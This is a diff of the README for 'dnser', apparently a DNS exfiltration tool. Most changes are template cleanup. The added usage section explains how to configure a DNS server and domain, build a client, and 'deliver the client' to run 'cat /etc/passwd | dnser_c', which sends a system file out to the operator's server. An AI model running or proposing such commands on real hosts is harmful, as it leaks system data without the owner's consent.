@@ -155,6 +155,30 @@ go version >= 1.21.5
 
 Before you start using it, you need to build the client binary, after which you can up the server.
 
+1. Create config
+  ```yaml
+  server:
+    port: <dnsport>
+    host: <ip>
+    domain: <domain for resolving>
+
+  client:
+    projectDir: <path to dnser/src/ (example: /tmp/dnser/src/)>
+  ```
+2. Build client. We get the path to the client binary
+  ```
+  ./server -config <path to config> -build
+  ```
+3. Start the server
+  ```
+  ./server -config <path to config> -serve
+  ```
+4. After that we deliver the client and launch
+  ```
+  cat /etc/passwd | dnser_c
+  ```
+
+
 _For more examples, please refer to the [SOON](SOON)_
 
 <p align="right">(<a href="#readme-top">back to top</a>)</p>
@@ -180,8 +204,6 @@ See the [open issues](https://github.com/fedoik/dnser/issues) for a full list of
 <!-- CONTRIBUTING -->
 ## Contributing
 
-Contributions are what make the open source community such an amazing place to learn, inspire, and create. Any contributions you make are **greatly appreciated**.
-
 If you have a suggestion that would make this better, please fork the repo and create a pull request. You can also simply open an issue with the tag "enhancement".
 Don't forget to give the project a star! Thanks again!
 
@@ -193,11 +215,11 @@ Don't forget to give the project a star! Thanks again!
 
 <p align="right">(<a href="#readme-top">back to top</a>)</p>
 
-### Top contributors:
+<!-- ### Top contributors:
 
 <a href="https://github.com/fedoik/dnser/graphs/contributors">
   <img src="https://contrib.rocks/image?repo=fedoik/dnser" alt="contrib.rocks image" />
-</a>
+</a> -->
 
 
 
@@ -213,7 +235,7 @@ Distributed under the project_license. See `LICENSE.txt` for more information.
 <!-- CONTACT -->
 ## Contact
 
-Your Name - [@twitter_handle](https://twitter.com/twitter_handle) - email@email_client.com
+Tg - [@fed01k](https://t.me/fed01k)
 
 Project Link: [https://github.com/fedoik/dnser](https://github.com/fedoik/dnser)
 
@@ -222,13 +244,13 @@ Project Link: [https://github.com/fedoik/dnser](https://github.com/fedoik/dnser)
 
 
 <!-- ACKNOWLEDGMENTS -->
-## Acknowledgments
+<!-- ## Acknowledgments
 
 * []()
 * []()
 * []()
 
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
+<p align="right">(<a href="#readme-top">back to top</a>)</p> -->
 
 
 
